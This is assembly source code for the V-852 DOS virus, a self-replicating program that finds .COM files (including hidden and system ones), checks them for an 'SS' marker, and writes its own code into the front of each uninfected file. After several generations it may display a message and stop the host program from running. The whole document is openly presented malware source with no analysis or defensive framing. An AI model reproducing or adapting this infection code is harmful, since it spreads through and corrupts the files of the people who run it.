	page	,132
	name	V852
	title	The V-852 virus, based on the V-847 virus
	.radix	16
code	segment
	assume	cs:code,ds:code
	org	100

timer	equ	6C
olddta	equ	80
virlen	equ	offset endcode - offset start
smalcod equ	offset endcode - offset transf
buffer	equ	offset endcode + 100
newdta	equ	offset endcode + 10
fname	=	newdta + 1E
virlenx =	offset endcode - offset start
newid	=	offset ident + virlenx + 100

start:
	jmp	virus

ident	dw	'SS'
counter db	0
allcom	db	'*.COM',0
vleng	dw	44F		;Unused
progbeg dd	10000h
eof	dw	?
handle	dw	?

virus:
	mov	ax,cs		;Move program code
	add	ax,1000 	; 64K bytes forward
	mov	es,ax
	inc	[counter]
	mov	si,offset start
	xor	di,di
	mov	cx,virlen
	rep	movsb

	mov	dx,newdta	;Set new Disk Transfer Address
	mov	ah,1A		;Set DTA
	int	21
	mov	dx,offset allcom	;Search for '*.COM' files
	mov	cx,110b 	;Normal, Hidden or System
	mov	ah,4E		;Find First file
	int	21
	jc	done		;Quit if none found

mainlp:
	mov	dx,offset fname
	mov	ax,3D02 	;Open file in Read/Write mode
	int	21
	mov	[handle],ax	;Save handle
	mov	bx,ax
	push	es
	pop	ds
	mov	dx,buffer
	mov	cx,0FFFF	;Read all bytes
	mov	ah,3F		;Read from handle
	int	21		;Bytes read in AX
	add	ax,buffer
	mov	cs:[eof],ax	;Save pointer to the end of file
	db	3E		;Force DS: prefix
	cmp	ds:[newid],'SS' ;Infected?
	je	close		;Go find next file

	xor	cx,cx		;Go to file beginning
	mov	dx,cx
	mov	bx,cs:[handle]
	mov	ax,4200 	;LSEEK from the beginning of the file
	int	21
	jc	close		;Leave this file if error occures

	mov	dx,0		;Write the whole code (virus+file)
	mov	cx,cs:[eof]	; back onto the file
	mov	bx,cs:[handle]
	mov	ah,40		;Write to handle
	int	21

close:
	mov	bx,cs:[handle]
	mov	ah,3E		;Close the file
	int	21

	push	cs
	pop	ds		;Restore DS
	mov	ah,4F		;Find next matching file
	mov	dx,newdta
	int	21
	jc	done		;Exit if all found
	jmp	mainlp		;Otherwise loop again

done:
	mov	dx,olddta	;Restore old Disk Transfer Address
	mov	ah,1A		;Set DTA
	int	21

	cmp	[counter],5	;If counter goes above 5,
	jb	progok		; the program becomes "sick"
	mov	ax,40
	mov	ds,ax		;Get the system timer value
	mov	ax,word ptr ds:[timer]
	push	cs
	pop	ds		;Restore DS
	and	ax,1		;At random (if timer value is odd)
	jz	progok		; display the funny message
	mov	dx,offset message
	mov	ah,9		;Print string
	int	21
	int	20		;Terminate program

message db	0A, 0Dh, 7
	db	'С║д за Владко и негови┐ ▓а▓ко !  '
	db	'Ние в▒и╖ки ▒ме за п░е│▒▓░ой▒▓во !'
	db	0A, 0Dh,'$'

progok:
	mov	si,offset transf	;Move this part of code
	mov	cx,smalcod	;Code length
	xor	di,di		;Move to ES:0
	rep	movsb		;Do it

	xor	di,di		;Clear DI
	mov	word ptr cs:[progbeg],0
	mov	word ptr cs:[progbeg+2],es	;Point progbeg at program start
	jmp	cs:[progbeg]	;Jump at program start

transf:
	push	ds
	pop	es
	mov	si,buffer+100
	cmp	[counter],1
	jne	skip
	sub	si,200
skip:
	mov	di,offset start
	mov	cx,0FFFF	;Restore original program's code
	sub	cx,si
	rep	movsb
	mov	word ptr cs:[start],offset start
	mov	word ptr cs:[start+2],ds
	jmp	dword ptr cs:[start]	;Jump to program start
endcode label	byte

	jmp	short quit	; The original program

	db	2 dup (90)	; Filler

quit:
	mov	ax,4C00 	; Just exit with ErrorLevel 0
	int	21

code	ends
	end	start
